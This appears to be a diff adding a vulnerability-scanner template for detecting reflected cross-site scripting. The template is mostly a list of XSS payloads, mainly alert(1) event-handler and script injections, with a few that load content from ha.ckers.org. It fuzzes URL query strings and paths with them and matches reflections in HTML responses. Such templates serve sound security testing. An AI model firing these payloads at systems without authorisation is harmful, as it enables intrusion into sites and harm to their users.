@@ -1,0 +1,95 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<details draggable=\"true\" ondragend=\"alert(1)\">test</details>"
+        - "<p draggable=\"true\" ondragleave=\"alert(1)\">test</p>"
+        - "<script>alert(1)</script>"
+        - "<SCRIPT>alert(\"XSS\");</SCRIPT>"
+        - "<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>"
+        - "<script>alert('XSS')</script>"
+        - "<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>"
+        - "<input autofocus draggable=\"true\" ondragenter=\"alert(1)\">"
+        - "<style>:target {color:red;}</style><progress id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></progress>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><progressitem ondrop=alert(1) contenteditable>drop here</progressitem>"
+        - "<svg/onload=javascript:alert(1)//>"
+        - "<iframe/onload=\"javascript:alert(1)\"></iframe/onload>"
+        - "<iframe oncopy=\"alert(1)\" contenteditable>test</iframe>"
+        - "&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;"
+        - "<output id=x tabindex=1 onfocusin=alert(1)></output>"
+        - "<col onmouseenter=\"alert(1)\">test</col>"
+        - "<embed src=\"http://ha.ckers.org/js.html#xss\"></embed>"
+        - "<video autoplay controls onended=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>"
+        - "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink:href\">"
+        - "<style>:target {color: red;}</style><progress id=x style=\"transition:color 10s\" ontransitionrun=alert(1)></progress>"
+        - "<svg draggable=\"true\" ondragend=\"alert(1)\">test</svg>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>"
+        - "<style>:target {color:red;}</style><mark id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></mark>"
+        - "<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>"
+        - "<svg xmlns=\"http://www.w3.org/2000/svg\"><title id=x></title><iframe srcdoc="
+        - "<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></h1>"
+        - "<p id=x tabindex=1 onbeforeactivate=alert(1)></p><input autofocus>"
+        - "<canvas draggable=\"true\" ondragleave=\"alert(1)\">test</canvas>"
+        - "<script>alert('XSS');</script>"
+        - "<SCRIPT>alert('XSS')</SCRIPT>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></col>"
+        - "<del oncopy=\"alert(1)\" contenteditable>test</del>"
+        - "<iframe src=\"http://ha.ckers.org/scriptlet.html\""
+        - "<output draggable=\"true\" ondragleave=\"alert(1)\">test</output>"
+        - "<embed style=behavior:url( url(#css); );"
+        - "<style>@keyframes x{}</style><bdo style=\"animation-name:x\" onanimationend=\"alert(1)\"></bdo>"
+        - "<svg/onload='javascript:alert(1)'>"
+        - "<form id=x tabindex=1 onfocusin=alert(1)></form><input autofocus>"
+        - "<details draggable=\"true\" ondragleave=\"alert(1)\">test</details>"
+        - "<noframes onkeyup=\"alert(1)\" contenteditable>test</noframes>"
+        - "<details draggable=\"true\" ondragleave=\"alert(1)\">test</details>"
+        - "<optgroup draggable=\"true\" ondragenter=\"alert(1)\">test</optgroup>"
+        - "<menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>"
+        - "<iframe onmouseenter=\"alert(1)\">test</iframe>"
+        - "<style>@keyframes x{}</style><source style=\"animation-name:x\" onanimationstart=\"alert(1)\"></source>"
+        - "<style>@keyframes x{}</style><source style=\"animation-name:x\" onanimationend=\"alert(1)\"></source>"
+        - "<html onclick=\"alert(1)\">test</html>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
